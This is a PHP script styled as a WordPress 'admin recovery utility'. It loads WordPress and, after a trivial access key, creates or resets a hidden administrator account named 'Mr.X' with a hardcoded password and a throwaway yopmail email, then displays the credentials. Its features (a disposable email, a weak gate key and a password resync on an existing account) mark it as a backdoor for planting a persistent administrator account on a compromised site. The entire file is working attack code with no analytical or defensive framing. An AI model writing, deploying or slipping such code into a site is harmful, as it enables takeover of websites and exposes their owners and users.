<?php
/**
 * Mr.X User Creation System WP V26
 * Professional Admin Recovery Utility
 */

// --- DYNAMIC WORDPRESS LOAD ---
// This function climbs the directory tree to find the WordPress core
function find_wp_load($path) {
    if (file_exists($path . '/wp-load.php')) {
        return $path . '/wp-load.php';
    }
    if ($path == dirname($path)) {
        return false;
    }
    return find_wp_load(dirname($path));
}

$wp_load_path = find_wp_load(dirname(__FILE__));

if ($wp_load_path) {
    require_once($wp_load_path);
} else {
    die("Error: WordPress (wp-load.php) could not be found. Ensure this script is within the site directory structure.");
}
// --- END DYNAMIC LOAD ---

// Configuration
$access_key   = '007'; // Required to run the script
$new_username = 'Mr.X';
$new_password = 'Asdf456321@';
$new_email    = 'jack440@yopmail.com';

$message = "";
$status_class = "";
$show_creds = false;

// Logic Execution
if (isset($_POST['access_password'])) {
    if ($_POST['access_password'] === $access_key) {
        
        if (!username_exists($new_username) && !email_exists($new_email)) {
            $user_id = wp_create_user($new_username, $new_password, $new_email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            $message = "<strong>Success:</strong> Administrator account deployed.";
            $status_class = "success";
            $show_creds = true;
        } else {
            $user = get_user_by('login', $new_username);
            if ($user) {
                wp_set_password($new_password, $user->ID);
                $message = "<strong>Success:</strong> User already exists. Password synchronized.";
                $status_class = "success";
                $show_creds = true;
            } else {
                $message = "<strong>Error:</strong> Email already exists under a different username.";
                $status_class = "error";
            }
        }
    } else {
        $message = "<strong>Access Denied:</strong> Invalid security key.";
        $status_class = "error";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mr.X System V26</title>
    <style>
        :root {
            --primary: #2563eb;
            --bg: #f1f5f9;
            --card: #ffffff;
            --text: #0f172a;
            --accent: #1e293b;
        }
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
            background: var(--bg); 
            color: var(--text);
            display: flex; align-items: center; justify-content: center;
            height: 100vh; margin: 0;
        }
        .container {
            width: 100%; max-width: 400px;
            background: var(--card);
            padding: 0; border-radius: 12px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .banner {
            background: var(--accent); color: #fff;
            padding: 1.5rem; text-align: center;
            font-weight: 700; font-size: 1.1rem;
            letter-spacing: 0.5px; border-bottom: 4px solid var(--primary);
        }
        .content { padding: 2rem; }
        .status-box {
            padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem;
            font-size: 0.875rem; line-height: 1.5;
        }
        .success { background: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
        .error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
        
        .credentials-box {
            background: #f8fafc; padding: 1.25rem;
            border-radius: 8px; margin-top: 0.5rem;
            border: 1px dashed #cbd5e1;
        }
        .label { display: block; font-size: 0.75rem; color: #64748b; font-weight: 600; margin-bottom: 0.25rem; }
        .value { font-family: monospace; font-size: 1.1rem; color: var(--primary); font-weight: bold; }

        input[type="password"] {
            width: 100%; padding: 12px; margin: 8px 0 20px 0;
            border: 1px solid #cbd5e1; border-radius: 6px;
            box-sizing: border-box; font-size: 1rem; transition: 0.2s;
        }
        input:focus { outline: 2px solid var(--primary); border-color: transparent; }
        
        button {
            width: 100%; padding: 12px;
            background: var(--primary); color: white;
            border: none; border-radius: 6px;
            font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        button:hover { background: #1d4ed8; transform: translateY(-1px); }
        .footer-note { text-align: center; margin-top: 1.5rem; color: #94a3b8; font-size: 0.75rem; }
    </style>
</head>
<body>

<div class="container">
    <div class="banner">
        Mr.X User Creation System <br> <span style="font-weight:300; font-size:0.8rem; opacity:0.8;">WP ENGINE V26</span>
    </div>

    <div class="content">
        <?php if ($message): ?>
            <div class="status-box <?php echo $status_class; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <?php if ($show_creds): ?>
            <div class="credentials-box">
                <span class="label">CREATED USER PASS:</span>
                <span class="value"><?php echo $new_username; ?> / <?php echo $new_password; ?></span>
            </div>
            <p style="text-align:center; font-size: 0.85rem; color: #64748b;">System is ready for login.</p>
        <?php else: ?>
            <form method="POST">
                <label style="font-weight: 600; font-size: 0.9rem;">System Access Password</label>
                <input type="password" name="access_password" placeholder="••••••••" required autofocus>
                <button type="submit">Initialize Deployment</button>
            </form>
        <?php endif; ?>
    </div>
    <div class="footer-note">
        Authorized use only. Delete script after use.
    </div>
</div>

</body>
</html>